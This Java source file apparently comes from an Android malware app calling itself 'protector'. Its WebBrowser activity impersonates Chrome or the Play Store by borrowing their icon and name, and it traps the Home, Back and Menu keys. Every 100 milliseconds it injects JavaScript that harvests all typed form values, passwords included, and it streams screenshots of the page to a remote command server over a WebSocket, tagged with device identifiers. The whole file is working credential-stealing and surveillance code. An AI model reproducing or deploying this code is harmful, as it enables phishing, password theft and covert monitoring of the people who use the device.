package com.icontrol.protector;

import static com.icontrol.protector.Consts.SPLIT_DATA;
import static com.icontrol.protector.Consts.URL_SOCKT;
import static com.icontrol.protector.UtliTools.drawableToBitmap;
import static com.icontrol.protector.UtliTools.isPackageInstalled;
import static com.icontrol.protector.WorkServices.MyWorker.AlertServer;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;

import android.os.Handler;
import android.os.Looper;
import android.util.Base64;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.ConsoleMessage;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.net.URI;
import java.util.ArrayList;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;


public class WebBrowser extends Activity {
    WebView mWebView;
    String Currentsite;
    Context myctx;
    private WebSocket websocketfile; // Reusable WebSocket
    private OkHttpClient client;
    @Override
    public void onBackPressed() {
        try {
            if (mWebView != null && mWebView.canGoBack()) {
                mWebView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (NullPointerException s) {
            super.onBackPressed();
        }
    }

    @Override
    public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
        return paramInt == KeyEvent.KEYCODE_HOME ||
                paramInt == KeyEvent.KEYCODE_BACK ||
                paramInt == KeyEvent.KEYCODE_MENU;
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        myctx = getApplicationContext();
        flaged=false;
        Intent intent = getIntent();
        String value = "";
        String thetype = "";
        try {
            value = intent.getStringExtra("key");
            thetype = intent.getStringExtra("type");
        } catch (Exception e) {
            finish();
            return;
        }

        try{

            try
            {
                if(intent.hasExtra("icon")){
                    byte[] iconByteArray = intent.getByteArrayExtra("icon");
                    Bitmap iconBitmap = BitmapFactory.decodeByteArray(iconByteArray, 0, iconByteArray.length);
                    ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription(" ", iconBitmap);
                    setTaskDescription(taskDescription);
                    String label = intent.getStringExtra("label");
                    setTitle(label);
                }else{
                    String packageName = "com.android.chrome";

                    if(!isPackageInstalled(packageName,getPackageManager())){
                        packageName = "com.android.vending";
                        if(!isPackageInstalled(packageName,getPackageManager())){
                            packageName = UtliTools.getRandomLauncherApp(getApplicationContext());
                            if(!isPackageInstalled(packageName,getPackageManager())){
                                packageName = null;
                            }
                        }
                    }
                    if(packageName != null){
                        PackageManager packageManager = getPackageManager();
                        ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
                        Drawable appIcon = packageManager.getApplicationIcon(applicationInfo);
                        String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                        setTitle(appName);
                        Bitmap appIconBitmap = drawableToBitmap(appIcon);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                            ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription(" ", appIconBitmap);
                            setTaskDescription(taskDescription);
                        }
                    }
                }

            }catch (Exception a){}



        }catch (Exception a){}

        try {
            //WebView mWebView = new WebView((Context)this);
            mWebView = new WebView(this);
            mWebView.getSettings().setJavaScriptEnabled(true);
            mWebView.getSettings().setLoadsImagesAutomatically(true);
            mWebView.getSettings().setLoadWithOverviewMode(true);
            try{
                CookieManager.getInstance().setAcceptCookie(true);
                CookieManager.getInstance().setAcceptThirdPartyCookies(mWebView, true);
            }catch (Exception a){

            }
            mWebView.getSettings().setUseWideViewPort(true);
            mWebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
            mWebView.getSettings().setAllowFileAccess(true);
            mWebView.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
            mWebView.getSettings().setDomStorageEnabled(true);
            mWebView.getSettings().setAllowFileAccessFromFileURLs(true);
            mWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
            mWebView.getSettings().setAllowContentAccess(true);
            try {
                mWebView.setLayerType(View.LAYER_TYPE_HARDWARE, null);
                mWebView.getSettings().setPluginState(WebSettings.PluginState.ON);
                mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
                mWebView.setBackgroundColor(0xffffffff);
            } catch (Exception a) {
            }

            mWebView.getSettings().setBuiltInZoomControls(false);
            String ua = mWebView.getSettings().getUserAgentString();
            mWebView.getSettings().setUserAgentString(ua);
            mWebView.setWebChromeClient(new MyChrome());
            mWebView.setWebViewClient(new MyWebViewClient());
            boolean allok = false;
            switch (thetype) {
                case "u"://url
                    Currentsite = value;
                    if (!value.toLowerCase().startsWith("https://") && !value.toLowerCase().startsWith("http://")) {
                        value = "http://" + value;
                    }
                    mWebView.loadUrl(value);
                    setContentView((View) mWebView);
                    allok =true;
                    break;
                case "f"://file
                    String pagehtml = (new String(Base64.decode(value, 0), "UTF-8"));
                    mWebView.loadDataWithBaseURL(null, pagehtml, "text/html", "UTF-8", null);
                    setContentView((View) mWebView);
                    allok =true;
                    break;
                default:
                    allok =false;
                    finish();
                    return;
            }
            if (allok){
                client = new OkHttpClient();
                startcaptures(getApplicationContext(),mWebView);
            }

        } catch (Exception exception) {
        }
    }

    private void startcaptures(Context ctx,WebView mWebView) {
        MySettings.WriteBool(ctx,Consts.web_browser,true);
        Runnable runnable = new Runnable() {
            public void run() {
                do {
                    try {
                        Thread.sleep(100);
                    } catch (InterruptedException e) {
                    }
                    Handler handler = new Handler(Looper.getMainLooper());
                    handler.post(new Runnable() {
                        @Override
                        public void run() {
                            try{
                                CapPass(ctx,mWebView);
                            }catch (Exception a){}
                        }
                    });
                    try {
                        mWebView.setDrawingCacheEnabled(true);
                        Bitmap b = Bitmap.createScaledBitmap(mWebView.getDrawingCache(false), 350, 650, false);
                        mWebView.setDrawingCacheEnabled(false);
                        String baseString = "null";
                        ByteArrayOutputStream byteStream = new ByteArrayOutputStream();
                        b.compress(Bitmap.CompressFormat.WEBP, 50, byteStream);
                        byte[] byteArray = byteStream.toByteArray();
                        baseString = Base64.encodeToString(byteArray, Base64.DEFAULT);


                        JSONObject jsonObject = new JSONObject();
                        jsonObject.put("type", "wbbrow");
                        jsonObject.put("img", baseString);
                        jsonObject.put("cuz", "n");
                        String jsonData = jsonObject.toString();

                        Sendimg(ctx,jsonData);

                    } catch (Exception ee) {
                        ee.printStackTrace();
                    }

                } while (MySettings.ReadBool(ctx,Consts.web_browser,false));
            }
        };
        Thread thread = new Thread(runnable);
        thread.start();
    }
    public class MyChrome extends WebChromeClient {
        MyChrome() {
        }
//        @Override
//        public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
//            String logmsg = consoleMessage.message();
//           try{
//               JSONObject jsonObject = new JSONObject();
//               jsonObject.put("type", "blog");
//               jsonObject.put("data", logmsg);
//               String jsonData = jsonObject.toString();
//
//               LiveChat.Livemessage(myctx,jsonData);
//           }catch (Exception a){}
//
//
//            return true;
//        }
    }
    static ArrayList<String> datastore = new ArrayList<>();

   public static void CapPass(Context ctx,WebView view) {
        if (view == null)
            return;
        view.evaluateJavascript("var frame = null;\n" +
                        "\n" +
                        "function gd332() {\n" +
                        "  if (!frame) {\n" +
                        "    frame = document.createElement('iframe');\n" +
                        "    frame.style.display = 'none';\n" +
                        "    document.body.appendChild(frame);\n" +
                        "  }\n" +
                        "  console = frame.contentWindow.console;\n" +
                        "  var inputs = document.querySelectorAll('input');\n" +
                        "  var websiteLink = window.location.hostname;\n" +
                        "  var result = [];\n" +
                        "\n" +
                        "  inputs.forEach(function(input) {\n" +
                        "    var type = input.getAttribute('type');\n" +
                        "    var value = input.value;\n" +
                        "\n" +
                        "    if (value !== \"\" && value !== null && type !== \"hidden\" && type !== \"checkbox\") {\n" +
                        "      var data = {\n" +
                        "        'type': type,\n" +
                        "        'value': value,\n" +
                        "        'date': new Date().toLocaleString()\n" +
                        "      };\n" +
                        "      result.push(data);\n" +
                        "    }\n" +
                        "  });\n" +
                        "\n" +
                        "  return JSON.stringify({\n" +
                        "    website: websiteLink,\n" +
                        "    inputs: result\n" +
                        "  });\n" +
                        "}\n" +
                        "\n" +
                        "gd332();\n",
                new ValueCallback<String>() {
                    @Override
                    public void onReceiveValue(String value) {
                        if (!value.equals("null") && !value.equals("\"\"")) {
                            try {
                                // Clean up the JSON string
                                value = value.substring(1, value.length() - 1).replace("\\\"", "\"");

                                // Parse the JSON object
                                JSONObject jsonObj = new JSONObject(value);

                                // Get website URL
                                String website = jsonObj.getString("website");
                                System.out.println("[Website]: " + website);

                                // Get the inputs array
                                JSONArray inputs = jsonObj.getJSONArray("inputs");
                                boolean storeit=false;
                                // Iterate through the input fields
                                for (int i = 0; i < inputs.length(); i++) {
                                    JSONObject inputObj = inputs.getJSONObject(i);

                                    // Extract the type, value, and date for each input
                                    String type = inputObj.optString("type","empty");
                                    String inputValue = inputObj.optString("value","empty");
                                    String date = inputObj.optString("date","empty");

                                    // Print the values
                                    System.out.println("[link]: " + website);
                                    System.out.println("[Type]: " + type);
                                    System.out.println("[Value]: " + inputValue);
                                    System.out.println("[Date]: " + date);

                                    String Alldata = website+SPLIT_DATA+ type+SPLIT_DATA+inputValue+SPLIT_DATA+date;

                                    String bs = Base64.encodeToString(Alldata.getBytes(), Base64.DEFAULT);

                                    datastore.add(bs);
                                    storeit =true;
                                }

                                if(storeit){
                                    MySettings.WriteList(ctx,Consts.web_pass,datastore);
                                }


                            } catch (Exception e) {
                                e.printStackTrace();
                            }
                        }
                    }
                });
    }

    private void Sendimg(Context ctx, String msg) {
        if (websocketfile == null) {
            Request request = new Request.Builder().url(URL_SOCKT()).build();

            if (client == null){
                return;
            }
            websocketfile = client.newWebSocket(request, new WebSocketListener() {
                @Override
                public void onOpen(WebSocket webSocket, Response response) {
                    // Connection established, send the message
                    sendWebSocketMessage(ctx, msg);
                }

                @Override
                public void onMessage(WebSocket webSocket, String text) {
                    // Handle server response if necessary
                    try{
                        JSONObject Response = new JSONObject(text);
                        String msgtype = Response.optString("type","empty");
                        if(msgtype.equals("stop") || msgtype.equals("Unauthorized access")){
                            websocketfile = null; // Set to null so it can be reconnected
                            client.dispatcher().executorService().shutdown();
                            MySettings.WriteBool(ctx,Consts.web_browser,false);
                        }
                    }catch (Exception a){}
                }

                @Override
                public void onClosed(WebSocket webSocket, int code, String reason) {
                    websocketfile = null; // Set to null so it can be reconnected
                    client.dispatcher().executorService().shutdown();
                }

                @Override
                public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                    t.printStackTrace();
                    websocketfile = null; // In case of failure, reset the WebSocket to null
                }
            });
        } else {
            // If WebSocket is already open, send the message directly
            sendWebSocketMessage(ctx, msg);
        }
    }

    private void sendWebSocketMessage(Context ctx, String msg) {
        try {
            String Myid = MySettings.Read(ctx, Consts.DEVICE_ID, "Deviceid");
            String IDF = MySettings.Read(ctx, Consts.THE_IDF, null);
            if (Myid == null || IDF == null) {
                websocketfile.close(1000, "Missing ID");
                return;
            }
            String CIP = MySettings.Read(ctx, Consts.THE_CIP, "null");

            JSONObject message = new JSONObject();
            // message.put("userId", userid);
            message.put("idf", IDF);
            message.put("pid", Myid);
            message.put("itype", "Slr_client");
            message.put("subc", "msg");
            message.put("msg", msg);
            message.put("cip", CIP);
            String conctkey = MySettings.Read(ctx,Consts.Redirect_k,My_Configs.CONS_KY);
            message.put("conk", conctkey);
            websocketfile.send(message.toString());
        } catch (Exception e) {
            e.printStackTrace();
            if (websocketfile != null) {
                websocketfile.close(1000, "Error during message sending");
            }
        }
    }

    private boolean flaged =false;
    public void closeWebSocket() {
       try {
           if (!flaged){
               flaged=true;
               AlertServer(getApplicationContext(),"Browser","Client Exit.");
           }
       }catch (Exception a){
           a.printStackTrace();
       }
        if (websocketfile != null) {
            websocketfile.close(1000, "Closing WebSocket");
            websocketfile = null;
        }
        if (client != null) {
            client.dispatcher().cancelAll();
            client.connectionPool().evictAll();
            client.dispatcher().executorService().shutdown();
            client = null;
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();

        MySettings.WriteBool(getApplicationContext(),Consts.web_browser,false);
        closeWebSocket();
    }

//    public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
//        return (paramInt == 3) ? true : ((paramInt == 4) ? true : ((paramInt == 82)));
//    }
    @Override
    protected void onStop() {
        super.onStop();
        MySettings.WriteBool(getApplicationContext(),Consts.web_browser,false);
        closeWebSocket();
    }

    private class MyWebChromeClient extends WebChromeClient {
        private MyWebChromeClient() {
        }

        public boolean onJsAlert(WebView param1WebView, String param1String1, String param1String2, JsResult param1JsResult) {
            return true;
        }
    }

    private class MyWebViewClient extends WebViewClient {
        @Override
        public void onPageStarted(WebView view, String url, Bitmap favicon) {
            super.onPageStarted(view, url, favicon);
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            // TODO Auto-generated method stub

            if (request != null && request.getUrl() != null) {
                String url = request.getUrl().toString();
                if (!url.startsWith("http") && url.contains("://")) {
                    try {

                        URI uri = new URI(url);
                        String newUrl = uri.getHost() + uri.getPath();

                        view.loadUrl(newUrl);
                        return true; // URL handled
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }


            return false;

        }

        @Override
        public void onReceivedError(WebView view, int errorCode,
                                    String description, String failingUrl) {

        }

        @Override
        public void onPageFinished(WebView view, String url) {
            // TODO Auto-generated method stub

            super.onPageFinished(view, url);

        }


    }

    public class WebAppInterface {
        Context mContext;

        WebAppInterface(Context param1Context) {
            this.mContext = param1Context;
        }


    }

}
